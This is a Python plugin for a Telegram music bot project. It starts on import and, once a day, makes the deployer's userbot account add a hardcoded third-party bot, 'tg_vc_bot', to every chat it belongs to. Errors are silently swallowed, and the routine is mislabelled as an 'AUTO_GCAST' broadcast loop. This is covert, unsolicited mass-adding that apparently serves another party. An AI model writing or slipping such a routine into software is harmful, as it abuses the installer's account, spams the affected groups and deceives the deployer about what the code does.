import asyncio
import datetime
from pyrogram import Client
from VIPMUSIC.utils.database import get_assistant
import config
from VIPMUSIC import app

AUTO_GCAST = True

ADD_INTERVAL = 86400  # Add every day (in seconds)

async def add_bot_to_chats():
    try:
        userbot = await get_assistant(config.LOGGER_ID)
        bot = await app.get_users("tg_vc_bot")
        bot_id = bot.id
        
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == config.LOGGER_ID:
                continue
            try:
                await userbot.add_chat_members(dialog.chat.id, bot_id)
                
            except Exception as e:
                await asyncio.sleep(3)  # Adjust sleep time based on rate limits
        
    except Exception as e:
        pass

async def continuous_adds():
    while True:
        if AUTO_GCAST:
            await add_bot_to_chats()
            
        await asyncio.sleep(ADD_INTERVAL)

# Start the continuous broadcast loop if AUTO_GCAST is True
if AUTO_GCAST:  
    asyncio.create_task(continuous_adds())
